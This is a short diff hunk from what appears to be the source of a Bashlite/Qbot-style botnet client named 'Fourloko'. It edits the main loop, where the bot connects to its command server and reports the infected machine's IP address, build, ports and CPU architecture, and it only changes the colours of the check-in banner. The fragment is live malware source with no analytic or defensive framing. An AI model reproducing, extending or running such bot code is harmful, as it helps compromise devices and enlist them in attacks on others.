@@ -1556,7 +1556,7 @@ int main(int argc, unsigned char *argv[])
         {
                 if(initConnection()) { sleep(5); continue; }
  
-        sockprintf(mainCommSock, "\e[0m[\e[1;34mFourloko\e[0m][\e[1;34m%s\e[0m][\e[1;34m%s\e[0m][\e[1;34m%s \e[0m][\e[1;34m%s ]", inet_ntoa(ourIP), getBuild(), getPortz(), getArch());
+        sockprintf(mainCommSock, "\e[0m[\e[1;36m\e[0m][\e[1;36m%s\e[0m][\e[1;36m%s\e[0m][\e[1;34m%s \e[0m][\e[1;34m%s ]", inet_ntoa(ourIP), getBuild(), getPortz(), getArch());
           echoLoader();
                 char commBuf[4096];
                 int got = 0;
